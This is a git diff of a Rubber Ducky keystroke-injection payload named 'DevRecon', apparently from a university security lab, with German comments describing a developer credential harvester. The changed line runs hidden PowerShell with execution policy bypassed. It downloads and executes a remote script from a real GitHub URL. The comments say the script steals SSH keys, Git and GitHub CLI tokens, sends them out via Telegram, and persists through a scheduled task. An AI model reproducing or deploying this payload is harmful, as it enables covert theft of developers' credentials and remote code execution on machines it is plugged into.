@@ -1,21 +1,14 @@
 REM ============================================================
-REM  W02a.6 Advanced – "DevRecon" – Multi-Stage Credential Harvester
+REM  W02a.6 Advanced – "DevRecon" – Developer Credential Harvester
 REM  Autoren: Raphael Bleier, Joachim Lugger
 REM  Ziel-OS: Windows
 REM
-REM  Lädt developer_recon.ps1 von einem öffentlichen GitHub Gist.
-REM  Exfiltration und Delivery vollständig über GitHub (HTTPS) –
-REM  kein lokaler Server, funktioniert über alle Subnetze.
-REM
-REM  Setup:
-REM    1. GITHUB_PAT (gist-Scope) in developer_recon.ps1 eintragen
-REM    2. developer_recon.ps1 als öffentliches Gist hochladen
-REM    3. GIST_RAW_URL unten ersetzen (Delivery-URL für Persistenz)
-REM    4. PERSIST_GIST_RAW_URL in developer_recon.ps1 eintragen
+REM  Lädt developer_recon.ps1 direkt von GitHub (fileless).
+REM  SSH-Keys, Git-Tokens, GitHub CLI Token kommen per Telegram.
+REM  Scheduled Task zieht Updates ebenfalls von GitHub.
 REM ============================================================
 
 DELAY 2000
-
 GUI r
 DELAY 500
-STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('GIST_RAW_URL');"
+STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/raphaelbleier/security-lab-aau-ss26-rubber-ducky/main/W02a/scripts/developer_recon.ps1');"
